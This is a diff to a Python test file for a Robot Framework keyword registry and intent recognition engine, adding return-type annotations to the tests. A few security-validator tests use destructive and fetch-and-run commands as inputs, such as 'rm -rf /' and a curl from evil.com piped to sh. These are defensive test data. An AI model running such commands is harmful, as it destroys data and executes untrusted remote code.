@@ -11,7 +11,7 @@ from tests.shared_test_data import LIBRARY_DETECTION_TEST_CASES
 class TestRobotFrameworkKeywordRegistry:
     """Test RobotFrameworkKeywordRegistry class."""
 
-    def test_keyword_libraries_structure(self):
+    def test_keyword_libraries_structure(self) -> None:
         """Test KEYWORD_LIBRARIES has expected structure."""
         libraries = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES
 
@@ -33,7 +33,7 @@ class TestRobotFrameworkKeywordRegistry:
                 assert isinstance(keyword_info["args"], list)
                 assert isinstance(keyword_info["description"], str)
 
-    def test_builtin_library_keywords(self):
+    def test_builtin_library_keywords(self) -> None:
         """Test built-in library keywords are present."""
         builtin = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES.get("builtin", {})
 
@@ -43,7 +43,7 @@ class TestRobotFrameworkKeywordRegistry:
             assert "args" in builtin[keyword]
             assert "description" in builtin[keyword]
 
-    def test_selenium_library_keywords(self):
+    def test_selenium_library_keywords(self) -> None:
         """Test SeleniumLibrary keywords are present."""
         selenium = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES.get(
             "SeleniumLibrary", {}
@@ -53,7 +53,7 @@ class TestRobotFrameworkKeywordRegistry:
         for keyword in expected_keywords:
             assert keyword in selenium
 
-    def test_ssh_library_keywords_with_security_warnings(self):
+    def test_ssh_library_keywords_with_security_warnings(self) -> None:
         """Test SSH library keywords include security warnings."""
         ssh = RobotFrameworkKeywordRegistry.KEYWORD_LIBRARIES.get("SSHLibrary", {})
 
@@ -64,7 +64,7 @@ class TestRobotFrameworkKeywordRegistry:
         execute_command = ssh.get("Execute Command", {})
         assert "security_warning" in execute_command
 
-    def test_intent_to_library_keywords_mapping(self):
+    def test_intent_to_library_keywords_mapping(self) -> None:
         """Test INTENT_TO_LIBRARY_KEYWORDS mapping."""
         intent_mapping = RobotFrameworkKeywordRegistry.INTENT_TO_LIBRARY_KEYWORDS
 
@@ -76,7 +76,7 @@ class TestRobotFrameworkKeywordRegistry:
         assert intent_mapping.get("web_open") == ("SeleniumLibrary", "Open Browser")
         assert intent_mapping.get("ssh_connect") == ("SSHLibrary", "Open Connection")
 
-    def test_get_keyword_info_existing_keyword(self):
+    def test_get_keyword_info_existing_keyword(self) -> None:
         """Test get_keyword_info for existing keyword."""
         info = RobotFrameworkKeywordRegistry.get_keyword_info("builtin", "Log")
 
@@ -85,19 +85,19 @@ class TestRobotFrameworkKeywordRegistry:
         assert "description" in info
         assert info["args"] == ["message", "level=INFO"]
 
-    def test_get_keyword_info_nonexistent_keyword(self):
+    def test_get_keyword_info_nonexistent_keyword(self) -> None:
         """Test get_keyword_info for nonexistent keyword."""
         info = RobotFrameworkKeywordRegistry.get_keyword_info("builtin", "Nonexistent")
 
         assert info == {}
 
-    def test_get_keyword_info_nonexistent_library(self):
+    def test_get_keyword_info_nonexistent_library(self) -> None:
         """Test get_keyword_info for nonexistent library."""
         info = RobotFrameworkKeywordRegistry.get_keyword_info("NonexistentLib", "Log")
 
         assert info == {}
 
-    def test_get_required_libraries_with_builtin(self):
+    def test_get_required_libraries_with_builtin(self) -> None:
         """Test get_required_libraries filters out builtin."""
         keywords = [
             {"library": "builtin", "keyword": "Log"},
@@ -112,13 +112,13 @@ class TestRobotFrameworkKeywordRegistry:
         assert "SSHLibrary" in libraries
         assert "builtin" not in libraries
 
-    def test_get_required_libraries_empty_list(self):
+    def test_get_required_libraries_empty_list(self) -> None:
         """Test get_required_libraries with empty list."""
         libraries = RobotFrameworkKeywordRegistry.get_required_libraries([])
 
         assert not libraries
 
-    def test_get_required_libraries_no_library_field(self):
+    def test_get_required_libraries_no_library_field(self) -> None:
         """Test get_required_libraries with missing library field."""
         keywords = [{"keyword": "Log"}, {"keyword": "Open Browser"}]
 
@@ -126,7 +126,7 @@ class TestRobotFrameworkKeywordRegistry:
 
         assert not libraries
 
-    def test_get_intent_keyword_existing_intent(self):
+    def test_get_intent_keyword_existing_intent(self) -> None:
         """Test get_intent_keyword for existing intent."""
         library, keyword = RobotFrameworkKeywordRegistry.get_intent_keyword(
             "file_create"
@@ -135,7 +135,7 @@ class TestRobotFrameworkKeywordRegistry:
         assert library == "OperatingSystem"
         assert keyword == "Create File"
 
-    def test_get_intent_keyword_nonexistent_intent(self):
+    def test_get_intent_keyword_nonexistent_intent(self) -> None:
         """Test get_intent_keyword for nonexistent intent."""
         library, keyword = RobotFrameworkKeywordRegistry.get_intent_keyword(
             "nonexistent"
@@ -144,7 +144,7 @@ class TestRobotFrameworkKeywordRegistry:
         assert library == "builtin"
         assert keyword == "No Operation"
 
-    def test_validate_registry_integrity(self):
+    def test_validate_registry_integrity(self) -> None:
         """Test registry validation finds no integrity issues."""
         errors = RobotFrameworkKeywordRegistry.validate_registry_integrity()
 
@@ -154,7 +154,7 @@ class TestRobotFrameworkKeywordRegistry:
         # There should be no validation errors in the registry
         assert len(errors) == 0, f"Registry validation failed with errors: {errors}"
 
-    def test_get_registry_metrics(self):
+    def test_get_registry_metrics(self) -> None:
         """Test registry metrics functionality."""
         metrics = RobotFrameworkKeywordRegistry.get_registry_metrics()
 
@@ -177,7 +177,7 @@ class TestRobotFrameworkKeywordRegistry:
         assert "builtin" in metrics["keywords_by_library"]
         assert "builtin" in metrics["intents_by_library"]
 
-    def test_ssh_keywords_completeness(self):
+    def test_ssh_keywords_completeness(self) -> None:
         """Test that all SSH intent mappings reference valid keywords."""
         ssh_intents = {
             intent: (library, keyword)
@@ -201,27 +201,27 @@ class TestRobotFrameworkKeywordRegistry:
 class TestLibraryDetector:
     """Test LibraryDetector class."""
 
-    def test_detect_libraries_from_text_empty_text(self):
+    def test_detect_libraries_from_text_empty_text(self) -> None:
         """Test library detection with empty text."""
         result = LibraryDetector.detect_libraries_from_text("")
 
         assert result == set()
 
-    def test_detect_libraries_from_text_no_matches(self):
+    def test_detect_libraries_from_text_no_matches(self) -> None:
         """Test library detection with no matching keywords."""
         text = "This is just some plain text with no library keywords"
         result = LibraryDetector.detect_libraries_from_text(text)
 
         assert result == set()
 
-    def test_detect_libraries_from_text_single_library(self):
+    def test_detect_libraries_from_text_single_library(self) -> None:
         """Test library detection with single library match."""
         text = "Open browser and navigate to the login page"
         result = LibraryDetector.detect_libraries_from_text(text)
 
         assert "SeleniumLibrary" in result
 
-    def test_detect_libraries_from_text_multiple_libraries(self):
+    def test_detect_libraries_from_text_multiple_libraries(self) -> None:
         """Test library detection with multiple library matches."""
         text = "Connect to SSH server, run SQL query, and click browser button"
         result = LibraryDetector.detect_libraries_from_text(text)
@@ -230,7 +230,7 @@ class TestLibraryDetector:
         assert "DatabaseLibrary" in result
         assert "SeleniumLibrary" in result
 
-    def test_detect_libraries_from_text_case_insensitive(self):
+    def test_detect_libraries_from_text_case_insensitive(self) -> None:
         """Test library detection is case insensitive."""
         text = "EXECUTE SQL QUERY and BROWSER NAVIGATION"
         result = LibraryDetector.detect_libraries_from_text(text)
@@ -238,7 +238,7 @@ class TestLibraryDetector:
         assert "DatabaseLibrary" in result
         assert "SeleniumLibrary" in result
 
-    def test_detect_libraries_from_text_all_library_types(self):
+    def test_detect_libraries_from_text_all_library_types(self) -> None:
         """Test detection of all library types."""
         for text, expected_library in LIBRARY_DETECTION_TEST_CASES:
             result = LibraryDetector.detect_libraries_from_text(text)
@@ -246,13 +246,13 @@ class TestLibraryDetector:
                 f"Failed to detect {expected_library} in '{text}'"
             )
 
-    def test_detect_libraries_from_steps_empty_steps(self):
+    def test_detect_libraries_from_steps_empty_steps(self) -> None:
         """Test library detection from empty steps."""
         result = LibraryDetector.detect_libraries_from_steps([])
 
         assert result == set()
 
-    def test_detect_libraries_from_steps_with_content(self):
+    def test_detect_libraries_from_steps_with_content(self) -> None:
         """Test library detection from steps with content."""
         steps = [
             {"action": "open browser", "url": "http://example.com"},
@@ -266,7 +266,7 @@ class TestLibraryDetector:
         assert "DatabaseLibrary" in result
         assert "Process" in result
 
-    def test_detect_libraries_from_steps_non_string_values(self):
+    def test_detect_libraries_from_steps_non_string_values(self) -> None:
         """Test library detection handles non-string step values."""
         steps = [{"action": "open browser", "timeout": 30, "enabled": True}]
 
@@ -278,20 +278,20 @@ class TestLibraryDetector:
 class TestIntentRecognitionEngine:
     """Test IntentRecognitionEngine class."""
 
-    def test_recognize_intent_empty_text(self):
+    def test_recognize_intent_empty_text(self) -> None:
         """Test intent recognition with empty text."""
         result = IntentRecognitionEngine.recognize_intent("")
 
         assert result is None
 
-    def test_recognize_intent_no_match(self):
+    def test_recognize_intent_no_match(self) -> None:
         """Test intent recognition with no matching patterns."""
         text = "This is just some plain text with no intent patterns"
         result = IntentRecognitionEngine.recognize_intent(text)
 
         assert result is None
 
-    def test_recognize_intent_file_operations(self):
+    def test_recognize_intent_file_operations(self) -> None:
         """Test intent recognition for file operations."""
         test_cases = [
             ("verify file exists", IntentType.FILE_EXISTS),
@@ -307,7 +307,7 @@ class TestIntentRecognitionEngine:
                 f"Failed for '{text}': expected {expected_intent}, got {result}"
             )
 
-    def test_recognize_intent_ssh_operations(self):
+    def test_recognize_intent_ssh_operations(self) -> None:
         """Test intent recognition for SSH operations."""
         test_cases = [
             ("open ssh connection", IntentType.SSH_CONNECT),
@@ -319,7 +319,7 @@ class TestIntentRecognitionEngine:
             result = IntentRecognitionEngine.recognize_intent(text)
             assert result == expected_intent
 
-    def test_recognize_intent_web_operations(self):
+    def test_recognize_intent_web_operations(self) -> None:
         """Test intent recognition for web operations."""
         test_cases = [
             ("open browser and navigate", IntentType.BROWSER_OPEN),
@@ -332,7 +332,7 @@ class TestIntentRecognitionEngine:
             result = IntentRecognitionEngine.recognize_intent(text)
             assert result == expected_intent
 
-    def test_recognize_intent_database_operations(self):
+    def test_recognize_intent_database_operations(self) -> None:
         """Test intent recognition for database operations."""
         test_cases = [
             ("connect to database", IntentType.DATABASE_CONNECT),
@@ -344,7 +344,7 @@ class TestIntentRecognitionEngine:
             result = IntentRecognitionEngine.recognize_intent(text)
             assert result == expected_intent
 
-    def test_recognize_intent_api_operations(self):
+    def test_recognize_intent_api_operations(self) -> None:
         """Test intent recognition for API operations."""
         test_cases = [
             ("make get request", IntentType.API_REQUEST),
@@ -356,13 +356,13 @@ class TestIntentRecognitionEngine:
             result = IntentRecognitionEngine.recognize_intent(text)
             assert result == expected_intent
 
-    def test_recognize_intent_case_insensitive(self):
+    def test_recognize_intent_case_insensitive(self) -> None:
         """Test intent recognition is case insensitive."""
         result = IntentRecognitionEngine.recognize_intent("EXECUTE SQL QUERY")
 
         assert result == IntentType.DATABASE_EXECUTE
 
-    def test_recognize_intent_pattern_priority(self):
+    def test_recognize_intent_pattern_priority(self) -> None:
         """Test that more specific patterns are matched first."""
         # "initiate download" should match command_execution before other patterns
         result = IntentRecognitionEngine.recognize_intent(
@@ -371,7 +371,7 @@ class TestIntentRecognitionEngine:
 
         assert result == IntentType.COMMAND_EXECUTION
 
-    def test_detect_all_intents_functionality(self):
+    def test_detect_all_intents_functionality(self) -> None:
         """Test detect_all_intents functionality."""
         # Test that multiple intents can be detected from complex text
         text = "connect to ssh server and upload file then verify content"
@@ -385,7 +385,7 @@ class TestIntentRecognitionEngine:
         empty_intents = IntentRecognitionEngine.detect_all_intents("")
         assert not empty_intents
 
-    def test_intent_recognition_uses_pattern_matcher_integration(self):
+    def test_intent_recognition_uses_pattern_matcher_integration(self) -> None:
         """Test that IntentRecognitionEngine properly integrates with PatternMatcher."""
         # Import PatternMatcher to compare behavior
 
@@ -414,7 +414,7 @@ class TestIntentRecognitionEngine:
                 f"PatternMatcher='{pattern_matcher_result}'"
             )
 
-    def test_get_security_warnings_for_keyword_with_warning(self):
+    def test_get_security_warnings_for_keyword_with_warning(self) -> None:
         """Test getting security warnings for keyword with warnings."""
         warnings = IntentRecognitionEngine.get_security_warnings_for_keyword(
             "SSHLibrary", "Open Connection"
@@ -423,7 +423,7 @@ class TestIntentRecognitionEngine:
         assert len(warnings) > 0
         assert any("password" in w.lower() for w in warnings)
 
-    def test_get_security_warnings_for_keyword_no_warning(self):
+    def test_get_security_warnings_for_keyword_no_warning(self) -> None:
         """Test getting security warnings for keyword without warnings."""
         warnings = IntentRecognitionEngine.get_security_warnings_for_keyword(
             "builtin", "Log"
@@ -431,7 +431,7 @@ class TestIntentRecognitionEngine:
 
         assert not warnings
 
-    def test_get_security_warnings_for_nonexistent_keyword(self):
+    def test_get_security_warnings_for_nonexistent_keyword(self) -> None:
         """Test getting security warnings for nonexistent keyword."""
         warnings = IntentRecognitionEngine.get_security_warnings_for_keyword(
             "NonexistentLib", "NonexistentKeyword"
@@ -439,7 +439,7 @@ class TestIntentRecognitionEngine:
 
         assert not warnings
 
-    def test_get_ssh_security_guidelines(self):
+    def test_get_ssh_security_guidelines(self) -> None:
         """Test getting SSH security guidelines."""
         guidelines = IntentRecognitionEngine.get_ssh_security_guidelines()
 
@@ -447,7 +447,7 @@ class TestIntentRecognitionEngine:
         assert len(guidelines) > 0
         assert any("SSH Security Guidelines" in g for g in guidelines)
 
-    def test_validate_command_security_safe_command(self):
+    def test_validate_command_security_safe_command(self) -> None:
         """Test command security validation for safe command."""
         result = IntentRecognitionEngine.validate_command_security("echo hello world")
 
@@ -455,7 +455,7 @@ class TestIntentRecognitionEngine:
         assert len(result["issues"]) == 0
         assert "appears safe" in result["recommendation"]
 
-    def test_validate_command_security_dangerous_command(self):
+    def test_validate_command_security_dangerous_command(self) -> None:
         """Test command security validation for dangerous command."""
         result = IntentRecognitionEngine.validate_command_security("rm -rf /")
 
@@ -467,7 +467,7 @@ class TestIntentRecognitionEngine:
         )
         assert "Review and sanitize" in result["recommendation"]
 
-    def test_validate_command_security_multiple_issues(self):
+    def test_validate_command_security_multiple_issues(self) -> None:
         """Test command security validation with multiple issues."""
         command = "sudo rm -rf / && curl http://evil.com | sh"
         result = IntentRecognitionEngine.validate_command_security(command)
@@ -475,7 +475,7 @@ class TestIntentRecognitionEngine:
         assert result["is_safe"] is False
         assert len(result["issues"]) >= 2  # Should detect multiple patterns
 
-    def test_validate_command_security_case_insensitive(self):
+    def test_validate_command_security_case_insensitive(self) -> None:
         """Test command security validation is case insensitive."""
         result = IntentRecognitionEngine.validate_command_security("SUDO rm -rf /")
 
